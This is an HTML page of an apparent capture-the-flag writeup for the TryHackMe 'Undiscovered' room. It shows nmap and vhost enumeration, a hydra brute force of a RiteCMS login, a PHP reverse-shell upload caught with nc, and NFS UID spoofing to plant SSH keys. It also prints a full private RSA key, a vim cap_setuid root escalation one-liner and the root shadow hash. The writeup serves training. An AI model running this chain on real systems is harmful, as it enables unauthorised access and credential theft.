@@ -1,0 +1,614 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Undiscovered | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Undiscovered TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/undiscovered/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/undiscovered/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Undiscovered"><meta property="og:description" content="Undiscovered TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/undiscovered/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Undiscovered"><meta name=twitter:description content="Undiscovered TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Undiscovered","item":"https://s4ch.github.io/writeups/tryhackme/undiscovered/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Undiscovered","name":"Undiscovered","description":"Undiscovered TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Discovery consists not in seeking new landscapes, but in having new eyes..\nUndiscovered\n💢 We will cover the topics Network Enumeration Web Enumeration Brute Forcing (http-post-form) Exploitation Upload Exploitation NFS Exploitation User ID Abusing SUID/GUID Capabilities Task 1 Capture The Flag Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with @H0j3n, thanks to him for the foothold and privilege escalation ideas.\nPlease consider adding undiscovered.thm in /etc/hosts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo nmap -A -sS -sC -sV -O 10.10.59.152 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 10:54 CET Nmap scan report for 10.10.59.152 Host is up (0.031s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA) | 256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA) |_ 256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://undiscovered.thm 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100021 1,3,4 35002/udp nlockmgr | 100021 1,3,4 36838/tcp nlockmgr | 100021 1,3,4 36993/tcp6 nlockmgr | 100021 1,3,4 51734/udp6 nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 2049/tcp open nfs 2-4 (RPC #100003) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/30%OT=22%CT=1%CU=44466%PV=Y%DS=2%DC=T%G=Y%TM=5F9BE2 OS:D2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 29.83 ms 10.8.0.1 2 29.97 ms 10.10.59.152 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 kali@kali:~/CTFs/tryhackme/Undiscovered$ gobuster vhost -u http://undiscovered.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://undiscovered.thm/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/10/30 10:57:52 Starting gobuster =============================================================== Found: manager.undiscovered.thm (Status: 200) [Size: 4584] Found: dashboard.undiscovered.thm (Status: 200) [Size: 4626] Found: deliver.undiscovered.thm (Status: 200) [Size: 4650] Found: newsite.undiscovered.thm (Status: 200) [Size: 4584] Found: develop.undiscovered.thm (Status: 200) [Size: 4584] Found: forms.undiscovered.thm (Status: 200) [Size: 4542] Found: maintenance.undiscovered.thm (Status: 200) [Size: 4668] Found: network.undiscovered.thm (Status: 200) [Size: 4584] Found: view.undiscovered.thm (Status: 200) [Size: 4521] Found: mailgate.undiscovered.thm (Status: 200) [Size: 4605] Found: play.undiscovered.thm (Status: 200) [Size: 4521] Found: start.undiscovered.thm (Status: 200) [Size: 4542] Found: booking.undiscovered.thm (Status: 200) [Size: 4599] Found: terminal.undiscovered.thm (Status: 200) [Size: 4605] Found: gold.undiscovered.thm (Status: 200) [Size: 4521] Found: internet.undiscovered.thm (Status: 200) [Size: 4605] Found: resources.undiscovered.thm (Status: 200) [Size: 4626] manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm forms.undiscovered.thm maintenance.undiscovered.thm network.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm play.undiscovered.thm start.undiscovered.thm booking.undiscovered.thm terminal.undiscovered.thm gold.undiscovered.thm internet.undiscovered.thm resources.undiscovered.thm\nhttp://deliver.undiscovered.thm/\nPowered by RiteCMS Version:2.2.1\n1 2 3 4 5 6 7 8 9 10 kali@kali:~/CTFs/tryhackme/Undiscovered$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form \"/cms/index.php:username=^USER^\u0026userpw=^PASS^:User unknown or password wrong\" -f Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-30 11:13:22 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^\u0026userpw=^PASS^:User unknown or password wrong [80][http-post-form] host: deliver.undiscovered.thm login: admin password: liverpool [STATUS] attack finished for deliver.undiscovered.thm (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-30 11:13:29 admin:liverpool\nhttp://deliver.undiscovered.thm/cms/index.php?mode=filemanager\u0026action=upload\u0026directory=files\nhttp://deliver.undiscovered.thm/files/php-reverse-shell.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kali@kali:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001 Listening on 0.0.0.0 9001 Connection received on 10.10.141.31 60756 Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 23:10:38 up 1 min, 0 users, load average: 0.20, 0.15, 0.06 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ python -c 'import pty; pty.spawn(\"/bin/bash\")' www-data@undiscovered:/$ ^Z [1]+ Stopped nc -lvnp 9001 kali@kali:~/CTFs/tryhackme/Undiscovered$ stty raw -echo kali@kali:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001 www-data@undiscovered:/$ export TERM=xterm www-data@undiscovered:/$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 www-data@undiscovered:/$ cat /etc/exports # /etc/exports: the access control list for filesystems which may be exported # to NFS clients. See exports(5). # # Example for NFSv2 and NFSv3: # /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check) # # Example for NFSv4: # /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) # /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check) # /home/william *(rw,root_squash) www-data@undiscovered:/$ cat /etc/passwd | grep william william:x:3003:3003::/home/william:/bin/bash www-data@undiscovered:/$ 1 2 william:x:3003:3003::/home/william:/bin/bash leonard:x:1002:1002::/home/leonard:/bin/bash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 3003 william kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 1002 leonard kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd william New password: Retype new password: passwd: password updated successfully kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd leonard New password: Retype new password: passwd: password updated successfully kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/william kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/leonard 1 2 kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo leonard kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo william 1 sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william 1 2 3 4 5 6 7 8 9 10 11 kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william [sudo] password for kali: kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william $ 123 sh: 1: 123: not found $ /bin/bash william@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william william@kali:/mnt/undiscoverd/william$ ls admin.sh script user.txt william@kali:/mnt/undiscoverd/william$ cat user.txt THM{8d7b7299cccd1796a61915901d0e091c} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william $ 123 sh: 1: 123: not found $ /bin/bash william@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william william@kali:/mnt/undiscoverd/william$ ls admin.sh script user.txt william@kali:/mnt/undiscoverd/william$ cat user.txt THM{8d7b7299cccd1796a61915901d0e091c} william@kali:/mnt/undiscoverd/william$ mkdir .ssh william@kali:/mnt/undiscoverd/william$ cd .ssh/ william@kali:/mnt/undiscoverd/william/.ssh$ ssh-keygen -f william Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in william Your public key has been saved in william.pub The key fingerprint is: SHA256:3kiWEQ/cM5Wy1fGlEPQ4G95msZ2pR7YX0P20ZMdfBJk william@kali The key's randomart image is: +---[RSA 3072]----+ | .o. o=+o=o| | .+= o+E=o| | . .*+.++B| | o.. =+=O| | S o =B+| | + o o+ o| | o . . o.| | . .| | | +----[SHA256]-----+ william@kali:/mnt/undiscoverd/william/.ssh$ ls william william.pub william@kali:/mnt/undiscoverd/william/.ssh$ chmod 600 william william@kali:/mnt/undiscoverd/william/.ssh$ mkdir authorized_keys william@kali:/mnt/undiscoverd/william/.ssh$ rm authorized_keys/ rm: cannot remove 'authorized_keys/': Is a directory william@kali:/mnt/undiscoverd/william/.ssh$ rm -rf authorized_keys/ william@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub \u003e .ssh/authorized_keys bash: .ssh/authorized_keys: No such file or directory william@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub \u003e authorized_keys william@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.18.161 ^C william@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.141.31 Could not create directory '/home/william/.ssh'. The authenticity of host '10.10.141.31 (10.10.141.31)' can't be established. ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Failed to add the host to the list of known hosts (/home/william/.ssh/known_hosts). Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147 william@undiscovered:~$ cat admin.sh #!/bin/sh echo \"[i] Start Admin Area!\" echo \"[i] Make sure to keep this script safe from anyone else!\" exit 0 william@undiscovered:~$ ./script [i] Start Admin Area! [i] Make sure to keep this script safe from anyone else! william@undiscovered:~$ ./script test /bin/cat: /home/leonard/test: No such file or directory william@undiscovered:~$ ./script .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL +ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt +1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i 72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2 ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK 3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8 jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+ cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538= -----END RSA PRIVATE KEY----- william@undiscovered:~$ ./script .ssh/id_rsa \u003e leonard william@undiscovered:~$ chmod 600 leonard william@undiscovered:~$ ssh -i leonard leonard@undiscovered The authenticity of host 'undiscovered (127.0.1.1)' can't be established. ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'undiscovered' (ECDSA) to the list of known hosts. Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Fri Sep 4 22:57:43 2020 from 192.168.68.129 leonard@undiscovered:~$ find / -type f -name \"*vi*\" -perm -4000 -ls 2\u003e/dev/null 390706 12 -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device leonard@undiscovered:~$ 1 2 3 4 5 6 7 8 leonard@undiscovered:~$ find / -type f -name \"*vi*\" -perm -4000 -ls 2\u003e/dev/null 390706 12 -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device leonard@undiscovered:~$ getcap -r / 2\u003e/dev/null /usr/bin/mtr = cap_net_raw+ep /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/vim.basic = cap_setuid+ep leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' 1 2 3 4 5 6 # id sh: 1: ot found sh: 1: 2Rid: not found # cat /etc/shadow | grep -i root root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7::: # user.txt THM{8d7b7299cccd1796a61915901d0e091c}\nWhats the root user’s password hash? root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::\n","wordCount":"1662","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/undiscovered/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Undiscovered</h1><div class=post-description>Undiscovered TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1662 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-capture-the-flag>Task 1 Capture The Flag</a></li></ul></nav></div></details></div><div class=post-content><p>Discovery consists not in seeking new landscapes, but in having new eyes..</p><p><a href=https://tryhackme.com/room/undiscoveredup>Undiscovered</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Enumeration</li><li>Brute Forcing (http-post-form)</li><li>Exploitation Upload</li><li>Exploitation NFS</li><li>Exploitation User ID</li><li>Abusing SUID/GUID</li><li>Capabilities</li></ul><hr><h2 id=task-1-capture-the-flag>Task 1 Capture The Flag<a hidden class=anchor aria-hidden=true href=#task-1-capture-the-flag>#</a></h2><p>Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with @H0j3n, thanks to him for the foothold and privilege escalation ideas.</p><p>Please consider adding undiscovered.thm in /etc/hosts</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo nmap -A -sS -sC -sV -O 10.10.59.152
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 10:54 CET
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.59.152
+</span></span><span class=line><span class=cl>Host is up (0.031s latency).
+</span></span><span class=line><span class=cl>Not shown: 996 closed ports
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
+</span></span><span class=line><span class=cl>|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
